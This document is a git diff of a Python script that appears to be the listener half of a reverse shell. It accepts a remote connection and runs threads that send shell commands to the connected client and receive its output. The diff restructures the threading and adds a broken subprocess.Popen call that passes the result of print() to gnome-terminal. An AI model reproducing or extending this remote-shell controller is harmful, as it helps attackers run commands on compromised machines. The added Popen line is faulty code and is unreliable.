@@ -1,4 +1,5 @@
 import socket
+import subprocess
 import threading
 import time
 import os
@@ -28,7 +29,6 @@ def shellreceiver(conn):
             conn.close()
             os._exit(0)
 
-
 # send commands to the client
 def shellsender(conn):
     while True:
@@ -40,20 +40,22 @@ def shellsender(conn):
             conn.close()
             os._exit(0)
               
-def client(conn):
-    pass
-        
+
 
 conn, addr = s.accept()
-print(conn)
-print(addr)
-print(Fore.GREEN + f"[*] Accepted new connection from: {addr[0]}:{addr[1]}" + Style.RESET_ALL)
+print(f"this is a conn:\n{conn}")
+print(f"This is the addr:\n{addr}")
+client = subprocess.Popen(["gnome-terminal", print(Fore.GREEN + f"[*] Accepted new connection from: {addr[0]}:{addr[1]}" + Style.RESET_ALL)])
+
+
 
 
 # start threads
-main_thread = threading.Thread(target=shellreceiver, target=shellsender, args=(conn,), daemon=True)
-main_thread.start()
+shell_rev= threading.Thread(target=shellreceiver, args=(conn,), daemon=True)
+shell_rev.start()
 
+shell_snd = threading.Thread(target=shellsender, args=(conn,), daemon=True )
+shell_snd.start()
 # keep main thread alive
 while True:
     time.sleep(1)
